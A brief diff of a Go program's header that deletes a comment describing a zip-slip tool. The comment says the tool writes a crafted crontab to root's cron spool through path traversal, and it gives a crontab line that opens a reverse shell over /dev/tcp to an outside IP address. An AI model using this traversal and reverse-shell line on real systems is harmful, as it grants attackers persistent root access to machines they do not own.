@@ -1,10 +1,3 @@
-/*
- * Tool to create custom zip file with path traversal for certain bad unzip implementations.
- * Usage: ./zipped crontab cron.zip ../../../../../../../var/spool/cron/crontabs/root
- *
- * crontab: 30 * * * * /bin/bash -c 'bash -i > /dev/tcp/157.245.248.176/8081 0>&1
- *
- */
 package main
 
 import (
